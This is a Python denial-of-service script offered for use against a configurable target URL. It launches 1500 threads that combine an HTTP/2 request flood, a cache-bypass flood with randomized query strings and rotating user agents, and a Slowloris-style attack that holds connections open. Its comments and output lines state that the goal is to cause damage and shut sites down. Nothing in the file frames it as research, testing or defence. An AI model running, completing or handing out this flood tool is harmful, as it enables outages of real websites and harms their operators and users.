import random
import threading
import time
from fake_useragent import UserAgent
import requests
from urllib3.exceptions import InsecureRequestWarning

# --- DISABLE SSL WARNINGS (for raw speed) ---
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- TARGET CONFIG ---
TARGET_URL = "https://example.com"  # REPLACE WITH YOUR TARGET
THREAD_COUNT = 1500  # More threads = more damage (but more risk)
REQUEST_DELAY = 0.001  # Ultra-low delay for maximum flood
RUN_TIME = 3600  # 1 hour of runtime (adjust as needed)

# --- USER AGENTS & HEADERS ---
ua = UserAgent()
headers_list = [
    {"User-Agent": ua.random, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Connection": "keep-alive"},
    {"User-Agent": ua.random, "Accept-Encoding": "gzip, deflate, br", "Cache-Control": "no-cache"},
    {"User-Agent": ua.random, "Accept-Language": "en-US,en;q=0.5", "Upgrade-Insecure-Requests": "1"}
]

# --- CACHE BYPASS PAYLOADS ---
cache_bypass_payloads = [
    "?cache_buster={random}",
    "?cb={random}",
    "?v={random}",
    "?version={random}"
]

# --- SLOWLORIS PAYLOAD (keeps connections open) ---
slowloris_headers = {
    "User-Agent": ua.random,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive",
    "Keep-Alive": "900",
    "Content-Length": "1000000",
    "X-a": f"SHUTDOWN-{random.randint(1, 999999)}"
}

# --- HTTP/2 FLOOD (if supported) ---
def http2_flood():
    try:
        # Requires h2 library and a HTTP/2-supported target
        from h2.connection import H2Connection
        from h2.config import H2Configuration
        import socket

        sock = socket.create_connection(("example.com", 443), timeout=5)  # REPLACE WITH TARGET
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # Send endless HTTP/2 requests
        while True:
            headers = [(f":authority", "example.com"), (f":path", f"/{random.randint(1, 999999)}"), (f":method", "GET"), (f":scheme", "https")]
            conn.send_headers(1, headers)
            sock.sendall(conn.data_to_send())
            time.sleep(0.1)
    except:
        pass

# --- CACHE BYPASS FLOOD ---
def cache_bypass_flood():
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            payload = random.choice(cache_bypass_payloads).format(random=random.randint(1, 999999))
            url = f"{TARGET_URL}{payload}"
            headers = random.choice(headers_list)
            requests.get(url, headers=headers, verify=False, timeout=5)
            print(f"[SHUTDOWN] CACHE BYPASS HIT: {url}")
        except:
            pass
        time.sleep(REQUEST_DELAY)

# --- SLOWLORIS ATTACK ---
def slowloris_attack():
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            s = requests.Session()
            s.get(TARGET_URL, headers=slowloris_headers, stream=True, timeout=1000)
            print(f"[SHUTDOWN] SLOWLORIS CONNECTION OPEN: {TARGET_URL}")
            time.sleep(1000)  # Keep connection open as long as possible
        except:
            pass

# --- MAIN ATTACK ---
def start_attack():
    print(f"[SHUTDOWN] UNLEASHING LAYER 7 HELL ON {TARGET_URL}!")
    for _ in range(THREAD_COUNT // 3):
        threading.Thread(target=http2_flood).start()
        threading.Thread(target=cache_bypass_flood).start()
        threading.Thread(target=slowloris_attack).start()

# --- RUN ---
if __name__ == "__main__":
    start_attack()

